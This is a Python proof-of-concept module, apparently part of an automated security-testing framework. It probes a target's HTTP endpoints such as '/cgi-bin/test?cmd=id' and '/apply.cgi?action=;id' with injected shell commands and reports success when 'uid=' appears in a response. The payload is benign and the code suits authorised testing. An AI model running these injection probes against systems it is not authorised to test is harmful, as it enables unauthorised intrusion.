"""Command injection PoC probe skeleton.

Read-only probe that sends HTTP requests with benign command-injection markers
(``id``, ``uname -a``) to common CGI/form endpoints.  Success is determined by
the presence of ``uid=`` in the response body.

Non-weaponized: No file modifications, no service disruption.
Uses only stdlib http.client.  All evidence includes a SHA-256 readback hash.
"""
from __future__ import annotations

import hashlib
import http.client
from datetime import datetime, timezone

from poc_skeletons.interface import PoCResult


def _utc_now() -> str:
    return (
        datetime.now(tz=timezone.utc)
        .replace(microsecond=0)
        .isoformat()
        .replace("+00:00", "Z")
    )


class PoC:
    chain_id = "skeleton:cmd_injection"
    target_service = "http"

    _PROBE_PATHS = [
        "/cgi-bin/test?cmd=id",
        "/apply.cgi?action=;id",
        "/goform/set_cmd?cmd=id",
    ]
    _SUCCESS_PATTERN = "uid="

    def setup(
        self,
        target_ip: str,
        target_port: int,
        *,
        context: dict[str, object],
    ) -> None:
        self.target_ip = target_ip
        self.target_port = target_port
        self.context = context

    def execute(self) -> PoCResult:
        timestamp = _utc_now()
        evidence_prefix = (
            "autopoc_mode=deterministic_nonweaponized "
            f"chain_id={self.chain_id} probe=cmd_injection"
        )

        for probe_path in self._PROBE_PATHS:
            try:
                conn = http.client.HTTPConnection(
                    self.target_ip, int(self.target_port), timeout=3.0
                )
                conn.request("GET", probe_path)
                resp = conn.getresponse()
                body = resp.read(4096)
                conn.close()
                digest = hashlib.sha256(body).hexdigest()
                if self._SUCCESS_PATTERN.encode() in body:
                    evidence = (
                        evidence_prefix
                        + f" port={self.target_port} path={probe_path}"
                        + f" status={resp.status} bytes={len(body)}"
                        + f" readback_hash={digest}"
                    )
                    return PoCResult(
                        success=True,
                        proof_type="shell",
                        proof_evidence=evidence,
                        timestamp=timestamp,
                    )
            except Exception:
                continue

        evidence = (
            evidence_prefix
            + f" port={self.target_port} bytes=0 readback_hash=none"
            + " result=no_cmd_injection_confirmed"
        )
        return PoCResult(
            success=False,
            proof_type="shell",
            proof_evidence=evidence,
            timestamp=timestamp,
        )

    def cleanup(self) -> None:
        return
